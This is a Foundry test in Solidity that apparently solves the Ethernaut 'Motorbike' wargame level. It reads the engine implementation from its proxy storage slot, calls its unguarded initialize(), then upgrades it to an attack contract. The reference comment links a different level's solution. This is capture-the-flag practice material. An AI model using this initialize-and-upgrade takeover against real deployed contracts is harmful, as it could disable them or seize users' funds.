// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "../src/Motorbike/Motorbike.sol";
import "../src/Motorbike/MotorbikeFactory.sol";
import "../src/Motorbike/MotorbikeHack.sol";
import "forge-std/Test.sol";
import "forge-std/console.sol";

//ref https://stermi.medium.com/the-ethernaut-challenge-12-solution-privacy-b7589abb1d0f

contract MotorbikeTest is Test {
    address _alice;
    bytes32 constant _IMPLEMENTATION_SLOT =
        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    function setUp() public {
        _alice = makeAddr("alice");
        vm.deal(_alice, 5 ether);
    }

    function testMotorbike() public {
        MotorbikeFactory factory = new MotorbikeFactory();
        address instance = factory.createInstance(_alice);
        address engineAddress = address(
            uint160(uint256(vm.load(instance, _IMPLEMENTATION_SLOT)))
        );

        assertEq(
            keccak256(
                Address.functionCall(
                    instance,
                    abi.encodeWithSignature("horsePower()")
                )
            ),
            keccak256(abi.encode(uint256(1000)))
        );

        MotorbikeHack hack = new MotorbikeHack();
        Engine(engineAddress).initialize();
        Engine(engineAddress).upgradeToAndCall(
            address(hack),
            abi.encodeWithSignature("attack()")
        );

        // ^0.8
        // assertTrue(factory.validateInstance(payable(engineAddress), _alice));
    }
}
